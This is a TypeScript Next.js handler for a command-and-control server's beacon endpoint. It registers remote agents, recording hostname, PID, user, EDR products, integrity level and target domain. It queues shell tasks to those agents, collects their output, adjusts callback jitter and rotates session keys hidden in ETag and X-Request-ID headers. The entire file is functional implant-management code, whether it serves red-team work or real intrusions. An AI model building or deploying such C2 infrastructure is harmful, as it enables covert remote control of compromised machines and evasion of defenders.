import { type NextRequest, NextResponse } from "next/server"
import { agentDb, commandDb, taskQueueDb, type Agent } from "@/lib/database"
import { v4 as uuidv4 } from "uuid"
import { randomBytes } from "crypto"

const buildTaskString = (task: { command?: string | null; args?: string | null }) => {
  const cmd = task.command ? String(task.command).trim() : ""
  const args = task.args ? String(task.args).trim() : ""
  return `${cmd}${args ? " " + args : ""}`.trim()
}

const buildTaskEnvelope = (task: { id: string; command: string; args?: string | null }) => {
  const taskText = buildTaskString(task)
  return {
    TaskID: task.id,
    TaskCMD: task.command,
    TaskArgument: task.args ? String(task.args) : "",
    TaskText: taskText,
  }
}

type TaskEnvelope = ReturnType<typeof buildTaskEnvelope>

const gTask = globalThis as any
const dispatchedTaskCache: Map<
  string,
  { agentId: string; command: string; commandArgs: string; taskText: string }
> = gTask.__dispatchedTaskCache || new Map()
gTask.__dispatchedTaskCache = dispatchedTaskCache

const rememberDispatchedTasks = (agentId: string, envelopes: TaskEnvelope[]) => {
  for (const env of envelopes) {
    if (!env || !env.TaskID) continue
    dispatchedTaskCache.set(env.TaskID, {
      agentId,
      command: env.TaskCMD || "",
      commandArgs: env.TaskArgument || "",
      taskText: env.TaskText || "",
    })
  }
}

const resolveDispatchedTask = (taskId?: string | null) => {
  if (!taskId) return null
  const info = dispatchedTaskCache.get(taskId)
  if (info) {
    dispatchedTaskCache.delete(taskId)
    return info
  }
  return null
}

const collectQueuedTasks = (agentId: string) => {
  const queued = taskQueueDb.getAllForAgent(agentId)
  if (!queued || queued.length === 0) {
    return null
  }
  const envelopes = queued.map((task) => buildTaskEnvelope(task))
  return {
    queued,
    envelopes,
    firstTaskText: envelopes[0]?.TaskText ?? buildTaskString(queued[0]),
  }
}

type IncomingResult = {
  taskId: string
  rawResult: string
  commandOverride?: string
  argsOverride?: string
  taskTextOverride?: string
}

const normalizeResultEntries = (body: any): IncomingResult[] => {
  const entries: IncomingResult[] = []
  const multi = body?.TaskResults ?? body?.task_results ?? body?.taskResults
  if (Array.isArray(multi)) {
    for (const item of multi) {
      if (!item) continue
      const raw =
        item.TaskResult ??
        item.task_result ??
        item.result ??
        item.Result ??
        item.value
      if (raw === undefined || raw === null) continue
      const taskIdValue = item.TaskID ?? item.task_id ?? item.taskId ?? ""
      const taskId =
        typeof taskIdValue === "string"
          ? taskIdValue.trim()
          : String(taskIdValue ?? "").trim()
      entries.push({
        taskId,
        rawResult: typeof raw === "string" ? raw : String(raw),
        commandOverride: item.TaskCMD ?? item.command ?? null,
        argsOverride: item.TaskArgument ?? item.args ?? item.arguments ?? null,
        taskTextOverride: item.TaskText ?? item.task_text ?? item.task ?? null,
      })
    }
  }
  if (entries.length === 0) {
    const singleRaw =
      body?.TaskResult ?? body?.task_result ?? body?.result ?? body?.Result
    if (singleRaw !== undefined && singleRaw !== null) {
      const taskIdValue = body?.TaskID ?? body?.task_id ?? body?.taskId ?? ""
      const taskId =
        typeof taskIdValue === "string"
          ? taskIdValue.trim()
          : String(taskIdValue ?? "").trim()
      entries.push({
        taskId,
        rawResult: typeof singleRaw === "string" ? singleRaw : String(singleRaw),
        commandOverride: body?.TaskCMD ?? body?.command ?? null,
        argsOverride: body?.TaskArgument ?? body?.args ?? null,
        taskTextOverride: body?.TaskText ?? body?.task ?? null,
      })
    }
  }
  return entries
}

const deriveCommandContext = (
  fallbackText: string,
  taskId?: string,
  overrides?: { cmd?: string | null; args?: string | null; text?: string | null },
) => {
  const cached = taskId ? resolveDispatchedTask(taskId) : null
  const cmd = overrides?.cmd ?? cached?.command ?? fallbackText.split(/\s+/)[0] ?? ""
  const args =
    overrides?.args ??
    cached?.commandArgs ??
    fallbackText
      .split(/\s+/)
      .slice(1)
      .join(" ")
  const descriptor =
    overrides?.text ??
    cached?.taskText ??
    (cmd ? `${cmd}${args ? " " + args : ""}` : fallbackText)
  return { cmd, args, descriptor }
}

const broadcastResult = (record: any) => {
  try {
    const g = globalThis as any
    if (g.__sseSubscribers && g.__sseSubscribers.size) {
      const payload = JSON.stringify(record)
      const msg = `event: command:result\ndata: ${payload}\n\n`
      for (const sub of g.__sseSubscribers as Set<{ id: number; send: (data: string) => void }>) {
        try { sub.send(msg) } catch {}
      }
    }
  } catch {}
}

const broadcastAgentRefresh = (agentId: string) => {
  try {
    const g = globalThis as any
    if (g.__sseSubscribers && g.__sseSubscribers.size) {
      const payload = JSON.stringify({ id: agentId })
      const msg = `event: agents:refresh\ndata: ${payload}\n\n`
      for (const sub of g.__sseSubscribers as Set<{ id: number; send: (data: string) => void }>) {
        try { sub.send(msg) } catch {}
      }
    }
  } catch {}
}

const deriveAgentConfigUpdate = (cmd?: string, args?: string | null): Partial<Agent> | null => {
  const base = String(cmd || "").trim().toLowerCase()
  if (base !== "set") return null
  const parts = String(args || "").trim().split(/\s+/).filter(Boolean)
  if (parts.length < 2) return null
  const key = parts[0].toLowerCase()
  const val = Number(parts[1])
  if (!Number.isFinite(val) || val <= 0) return null
  if (key === "cb" || key === "callback" || key === "interval") {
    return { callback_interval: val }
  }
  if (key === "jitter" || key === "jit" || key === "j") {
    return { jitter_value: val }
  }
  return null
}

export async function handleBeaconPost(request: NextRequest) {
  try {
    const body = await request.json()

    // Allow probes
    if (body && body.ping) return new NextResponse(null, { status: 204 })

    // Results POST flow (strictly via session header)
    const normalizedEntries = normalizeResultEntries(body)

    if (normalizedEntries.length > 0) {
      const headers = Object.fromEntries(request.headers.entries())
      const sess = headers["session"] || headers["session-key"] || headers["ETag"] || headers["X-Request-ID"]
      if (!sess) return NextResponse.json({ error: "missing session_key" }, { status: 401 })
      const a = agentDb.getBySessionKey(sess)
      if (!a) return NextResponse.json({ error: "unauthorized" }, { status: 401 })

      const nowIso = new Date().toISOString()
      let updatedHistory = a.terminal_history || ""
      let lastErrorTask = ""
      let lastError = ""
      const historyEntries: string[] = []
      let agentConfigChanged = false

      for (const entry of normalizedEntries) {
        const baseTaskText = (a.last_queued_task || "").trim()
        const { cmd, args, descriptor } = deriveCommandContext(baseTaskText, entry.taskId, {
          cmd: entry.commandOverride,
          args: entry.argsOverride,
          text: entry.taskTextOverride,
        })
        const trimmed = entry.rawResult.trim()
        const lower = trimmed.toLowerCase()
        const isBool = lower === "true" || lower === "false"
        const success = isBool ? lower === "true" : true
        const command_result = isBool ? "" : entry.rawResult
        const error = success ? "" : (command_result || "Command failed")
        if (!success) {
          lastErrorTask = descriptor || baseTaskText || cmd
          lastError = error
        }

        const rec = commandDb.create({
          id: entry.taskId || uuidv4(),
          agent_id: a.id,
          command: cmd,
          command_args: args,
          command_result,
          success,
          error,
          time_tasked: nowIso,
          time_completed: nowIso,
        })
        broadcastResult(rec)

        if (success) {
          const cfg = deriveAgentConfigUpdate(cmd, args)
          if (cfg) {
            try {
              agentDb.update(a.id, cfg as any)
              agentConfigChanged = true
            } catch {}
          }
        }

        const ts = new Date().toLocaleTimeString("en-US", {
          hour12: false,
          hour: "2-digit",
          minute: "2-digit",
          second: "2-digit",
        })
        historyEntries.push(
          `${ts}\nAgent returned ${descriptor || cmd || "task"} results at ${ts}:\n${
            command_result || (success ? "OK" : error)
          }\n\n`,
        )
      }

      if (historyEntries.length > 0) {
        updatedHistory += historyEntries.join("")
        agentDb.update(a.id, {
          terminal_history: updatedHistory,
          current_running_task: "",
          last_error_task: lastErrorTask,
          last_error: lastError,
          last_seen_timestamp: Date.now(),
          last_callback: nowIso,
        })
      }

      // Rotate session key and return next task (if any)
      const newSession = randomBytes(32).toString("hex")
      let payload: any = { session_key: newSession }
      const queuedBundle = collectQueuedTasks(a.id)
      if (queuedBundle) {
        rememberDispatchedTasks(a.id, queuedBundle.envelopes)
        payload.Tasks = queuedBundle.envelopes
        payload.TaskCount = queuedBundle.envelopes.length
        try { taskQueueDb.deleteByIds(queuedBundle.queued.map((task) => task.id)) } catch {}
        try {
          agentDb.update(a.id, {
            last_queued_task: queuedBundle.firstTaskText,
            current_running_task: queuedBundle.firstTaskText,
            session_key: newSession,
          })
        } catch {}
      } else {
        try { agentDb.update(a.id, { session_key: newSession }) } catch {}
      }

      if (agentConfigChanged) {
        broadcastAgentRefresh(a.id)
      }

      const res = NextResponse.json(payload)
      try { res.headers.set('ETag', newSession) } catch {}
      return res
    }

    // Registration/update flow
    const nowIso = new Date().toISOString()
    const nowMs = Date.now()
    const agentKey = body.agent_key || body.agentId || body.id
    if (!agentKey) return NextResponse.json({ error: "agent_key required" }, { status: 400 })
    const existing = agentDb.getById(agentKey)

    const common = {
      id: agentKey,
      hostname: String(body.hostname || "host"),
      ip_addr: JSON.stringify(
        Array.isArray(body.ip_addr) ? body.ip_addr : (body.ip_addr ? [String(body.ip_addr)] : []),
      ),
      os: String(body.os || "unknown"),
      build: String(body.build || ""),
      last_callback: nowIso,
      created_time: existing?.created_time || nowIso,
      callback_interval: Number(body.callback_interval || body.interval || existing?.callback_interval || 60),
      jitter_value: Number(body.jitter_value || body.jitter || existing?.jitter_value || 15),
      jitter_translate: Number(body.jitter_translate || existing?.jitter_translate || 60),
      pid: Number(body.pid || existing?.pid || 0),
      user_context: String(body.user || body.user_context || existing?.user_context || ""),
      base_agent: String(body.base_agent || existing?.base_agent || "toliet_oracle"),
      terminal_history: existing?.terminal_history || "",
      loaded_commands: existing?.loaded_commands || "[]",
      cwd: String(body.cwd || existing?.cwd || "/"),
      last_queued_task: existing?.last_queued_task || "",
      current_running_task: existing?.current_running_task || "",
      last_error_task: existing?.last_error_task || "",
      listener: existing?.listener || "default",
      work_hours: existing?.work_hours || "24/7",
      kill_date: existing?.kill_date || undefined,
      edr: String(body.edr || existing?.edr || "[]"),
      target_domain: existing?.target_domain || "",
      last_error: existing?.last_error || "",
      default_shell: existing?.default_shell || "powershell",
      integrity_level: existing?.integrity_level || "user",
      status: "connecting" as const,
      last_seen_timestamp: nowMs,
    }

    const session_key = randomBytes(32).toString("hex")
    if (!existing) {
      agentDb.create({ ...(common as any), session_key })
    } else {
      agentDb.update(agentKey, { ...(common as any), session_key })
    }

    const res = NextResponse.json({ session_key })
    try { res.headers.set('ETag', session_key) } catch {}
    return res
  } catch (error) {
    console.error("beacon POST error:", error)
    return NextResponse.json({ error: "server error" }, { status: 500 })
  }
}

export async function handleBeaconGet(request: NextRequest) {
  try {
    const headers = Object.fromEntries(request.headers.entries())
    // Identify by session key (prefer 'Session', fallback to If-None-Match)
    const sess = headers["session"] || headers["session-key"] || headers["ETag"] || headers["X-Request-ID"]
    if (!sess) return NextResponse.json({ error: "missing session_key" }, { status: 401 })

    const agent = agentDb.getBySessionKey(sess)
    if (!agent) return NextResponse.json({ error: "invalid session_key" }, { status: 401 })

    // Rotate session token for caller
    const newSession = randomBytes(32).toString("hex")

    // Next queued task(s) (if any)
    const queuedBundle = collectQueuedTasks(agent.id)
    const payload: any = {}

    if (queuedBundle) {
      rememberDispatchedTasks(agent.id, queuedBundle.envelopes)
      payload.Tasks = queuedBundle.envelopes
      payload.TaskCount = queuedBundle.envelopes.length
      try { taskQueueDb.deleteByIds(queuedBundle.queued.map((task) => task.id)) } catch {}
      try {
        agentDb.update(agent.id, {
          last_queued_task: queuedBundle.firstTaskText,
          current_running_task: queuedBundle.firstTaskText,
          session_key: newSession,
          last_seen_timestamp: Date.now(),
          last_callback: new Date().toISOString(),
        })
      } catch {}
    } else {
      try {
        agentDb.update(agent.id, {
          session_key: newSession,
          last_seen_timestamp: Date.now(),
          last_callback: new Date().toISOString(),
        })
      } catch {}
    }

    const responsePayload: any = { session_key: newSession }
    if (payload.Tasks && payload.Tasks.length) {
      responsePayload.Tasks = payload.Tasks
      responsePayload.TaskCount = payload.TaskCount ?? payload.Tasks.length
    }

    const res = NextResponse.json(responsePayload)
    try { res.headers.set('ETag', newSession) } catch {}
    return res
  } catch (error) {
    console.error("beacon GET error:", error)
    return NextResponse.json({ error: "server error" }, { status: 500 })
  }
}

